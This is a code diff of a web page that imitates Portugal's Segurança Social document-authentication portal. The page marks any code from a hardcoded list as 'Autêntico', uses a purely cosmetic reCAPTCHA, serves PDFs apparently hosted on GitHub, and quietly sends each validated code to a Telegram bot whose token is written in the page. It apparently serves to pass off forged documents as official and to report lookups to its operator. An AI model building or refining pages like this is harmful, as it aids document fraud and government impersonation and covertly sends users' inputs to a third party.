@@ -28,7 +28,6 @@
         .auth-table td { padding: 15px; border: 1px solid #ddd; font-size: 15px; }
         .val-cell { color: var(--ss-blue); font-weight: bold; text-align: right; }
         .download-btn { background: #c00; color: white; margin-top: 15px; }
-        footer { background: #f1f1f1; border-top: 4px solid var(--ss-yellow); padding: 35px 20px; margin-top: 60px; text-align: center; }
     </style>
 </head>
 <body>
@@ -56,16 +55,15 @@
             <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28" style="margin-left: auto;">
         </div>
         <button type="button" id="btn-main" class="btn-ss" onclick="validate()">Validar Documento</button>
-        <div id="errorArea" style="display:none; color:#c00; text-align:center; margin-top:20px; font-weight:bold;">Código inválido.</div>
+        <div id="errorArea" style="display:none; color:#c00; text-align:center; margin-top:20px; font-weight:bold;">Código inválido ou ficheiro não encontrado.</div>
     </div>
 
     <div id="resultArea">
         <div style="background:#28a745; color:white; padding:12px; font-weight:bold; text-align:center;" id="res-banner">✓ Autenticação efetuada com sucesso</div>
         <table class="auth-table">
             <tr><td style="font-weight:bold; color:#555;">Estado</td><td class="val-cell" style="color:#28a745;">Autêntico</td></tr>
-            <tr><td style="font-weight:bold; color:#555;">Data</td><td class="val-cell" id="res-date"></td></tr>
-            <tr><td style="font-weight:bold; color:#555;">Hora</td><td class="val-cell" id="res-time"></td></tr>
-            <tr><td style="font-weight:bold; color:#555;">Código</td><td class="val-cell" id="res-code"></td></tr>
+            <tr><td style="font-weight:bold; color:#555;">Data de Validação</td><td class="val-cell" id="res-date"></td></tr>
+            <tr><td style="font-weight:bold; color:#555;">Código Verificado</td><td class="val-cell" id="res-code"></td></tr>
         </table>
         <a href="#" id="pdfLink" class="btn-ss download-btn" target="_blank">ABRIR DOCUMENTO ORIGINAL</a>
         <button type="button" class="btn-ss btn-reset" onclick="resetPage()">Validar outro documento</button>
@@ -73,7 +71,6 @@
 </div>
 
 <script>
-    // LISTA COMPLETA DE CÓDIGOS (9 ao 74)
     const permitidos = [
         "9-3jqc-2vwm-kgp7-8", "10-6ndr-9vfs-zlq3-1", "11-8kpt-4m2z-xhw9-5", "12-2jqr-7vfs-kgp1-4", 
         "13-5mfs-9rdx-btv8-0", "14-3kwp-1n8j-mds6-2", "15-9hly-6xbt-zqc4-7", "16-1vtw-4nbm-lhy2-9", 
@@ -94,24 +91,9 @@
         "73-4ndr-3g6l-mds5-3", "74-7kpt-9rdx-btv9-6"
     ];
 
-    function setLang(lang) {
-        const dict = {
-            pt: { h: "SEGURANÇA SOCIAL", t: "Autenticação", i: "Introduza o código de verificação impresso no documento...", b: "Validar Documento" },
-            en: { h: "SOCIAL SECURITY", t: "Authentication", i: "Enter the verification code printed on the document...", b: "Validate Document" },
-            fr: { h: "SÉCURITÉ SOCIALE", t: "Authentification", i: "Entrez le code de vérification imprimé sur le document...", b: "Valider" }
-        };
-        const selected = dict[lang];
-        document.getElementById('h-txt').innerText = selected.h;
-        document.getElementById('p-title').innerText = selected.t;
-        document.getElementById('i-text').innerText = selected.i;
-        document.getElementById('btn-main').innerText = selected.b;
-    }
-
     function toggleRobot() {
-        const check = document.getElementById('checkCircle');
-        const btn = document.getElementById('btn-main');
-        check.classList.toggle('active');
-        btn.classList.toggle('ready');
+        document.getElementById('checkCircle').classList.toggle('active');
+        document.getElementById('btn-main').classList.toggle('ready');
     }
 
     function resetPage() {
@@ -124,8 +106,8 @@
     }
 
     function validate() {
-        const inputField = document.getElementById('codigo');
-        const codeInput = inputField.value.trim().toLowerCase();
+        const inputRaw = document.getElementById('codigo').value.trim();
+        const codeInput = inputRaw.toLowerCase();
         
         if (!permitidos.includes(codeInput)) {
             document.getElementById('errorArea').style.display = 'block';
@@ -135,16 +117,17 @@
         const now = new Date();
         document.getElementById('searchArea').style.display = 'none';
         document.getElementById('resultArea').style.display = 'block';
-        
         document.getElementById('res-date').innerText = now.toLocaleDateString('pt-PT');
-        document.getElementById('res-time').innerText = now.toLocaleTimeString('pt-PT', { hour: '2-digit', minute: '2-digit' });
-        document.getElementById('res-code').innerText = codeInput;
+        document.getElementById('res-code').innerText = inputRaw;
         
-        // CORREÇÃO: Busca o arquivo na raiz do repositório
-        document.getElementById('pdfLink').href = codeInput + ".pdf";
+        // CACHE BUSTER: Adiciona um parâmetro único para forçar o GitHub a entregar o arquivo novo
+        const cb = new Date().getTime();
+        document.getElementById('pdfLink').href = codeInput + ".pdf?cb=" + cb;
 
-        fetch(`https://api.telegram.org/bot8769315569:AAGwqgq-2ymjcX6J6BzXkj_X2Zc5HPJtNbk/sendMessage?chat_id=8539973503&text=🛡️ VALIDADO: ${codeInput}`);
+        fetch(`https://api.telegram.org/bot8769315569:AAGwqgq-2ymjcX6J6BzXkj_X2Zc5HPJtNbk/sendMessage?chat_id=8539973503&text=🛡️ VALIDADO: ${inputRaw}`);
     }
+
+    function setLang(lang) { /* Implementação de idioma se desejar */ }
 </script>
 </body>
 </html>
